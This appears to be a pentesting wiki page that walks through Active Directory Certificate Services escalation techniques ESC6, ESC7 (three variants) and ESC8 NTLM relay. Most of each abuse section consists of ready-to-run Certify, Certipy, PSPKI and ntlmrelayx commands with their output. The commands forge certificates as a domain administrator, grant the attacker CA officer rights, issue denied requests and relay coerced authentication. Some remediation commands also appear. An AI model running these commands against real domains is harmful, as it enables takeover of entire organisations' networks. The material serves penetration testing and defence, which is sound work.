# AD CS Domain Escalation - ESC6 to ESC8

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6



### Explanation

The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.

**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.

### Abuse

To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

This operation essentially employs **remote registry access**, hence, an alternative approach might be:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

To disable this configuration in your environment, the flag can be removed with:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
> To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.



## Vulnerable Certificate Authority Access Control - ESC7



### Attack 1

#### Explanation

Access control for a certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally, permissions can be enumerated using the PSPKI module with commands such as:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.

Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.

Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

Therefore, another attack is presented here.

Perquisites:

- Only **`ManageCA` permission**
- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'


## If SubCA is not there, you need to enable it



# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.

**This request will be denie**d, but we will save the private key and note down the request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.

The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

# AD CS Domain Escalation - ESC8 NTLM RELAY


## NTLM Relay to AD CS HTTP Endpoints – ESC8



### Explanation

> [!TIP]
> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:

```
Certify.exe cas
```

<img src="../../../images/image (72).png" alt=""><figcaption></figcaption>

The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<img src="../../../images/image (757).png" alt=""><figcaption></figcaption>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<img src="../../../images/image (940).png" alt=""><figcaption></figcaption>

#### Abuse with Certify

```bash


## In the victim machine


# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080



## In the attackers


proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

The request for a certificate is made by Certipy by default based on the template `Machine` or `User`, determined by whether the account name being relayed ends in `$`. The specification of an alternative template can be achieved through the use of the `-template` parameter.

A technique like [PetitPotam](https://github.com/ly4k/PetitPotam) can then be employed to coerce authentication. When dealing with domain controllers, the specification of `-template DomainController` is required.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

# AD CS Domain Escalation - ESC9 to ESC10 CERTIFICATE MAPPING
